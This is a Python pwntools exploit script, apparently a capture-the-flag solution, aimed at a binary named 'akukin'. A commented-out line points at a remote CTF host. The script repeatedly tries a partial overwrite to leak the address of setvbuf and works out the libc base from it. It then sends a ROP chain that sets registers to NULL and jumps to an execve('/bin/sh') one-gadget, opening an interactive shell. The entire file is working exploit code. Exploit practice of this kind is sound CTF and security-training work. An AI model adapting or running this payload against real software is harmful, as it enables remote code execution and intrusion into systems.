from pwn import *

l = ELF('./libc.so.6')

context.arch = 'amd64'


def byte_to_int(byte_addr):
    byte_int = int(byte_addr.decode('utf-8')[2:], 16)
    return byte_int


for i in range(100):
    try:
        p = process("./akukin")
        # p = remote('ctf.adl.tw', 10006)

        p.sendlineafter(b'> ', str(2))

        p.sendafter(b'> ', b'a'*40+b'\x73\xf2')

        if p.recv(20) == b'Akukin find setvbuf ':
            # get setvbuf address
            byte_addr = p.recv(14)
            byte_setvbuf_int = byte_to_int(byte_addr)

            # libc_base = setvbuf_addr - setbuf_offset
            libc_base = byte_setvbuf_int - l.symbols["setvbuf"]

            # 0xe3b2e execve("/bin/sh", r15, r12)
            # constraints:
            # [r15] == NULL || r15 == NULL
            # [r12] == NULL || r12 == NULL

            # 0x0000000000023b71 : pop r15 ; ret
            # 0x000000000002f739 : pop r12 ; ret

            payload = b'a'*0x78
            # r15 = NULL
            payload += p64(libc_base + 0x23b71) + p64(0)
            # r12 = NULL
            payload += p64(libc_base + 0x2f739) + p64(0)
            # address of execve()
            payload += p64(libc_base + 0xe3b2e)

            p.sendlineafter(b'> ', payload)

            p.interactive()

        p.close()

    except:
        p.close()
        continue

p.interactive()
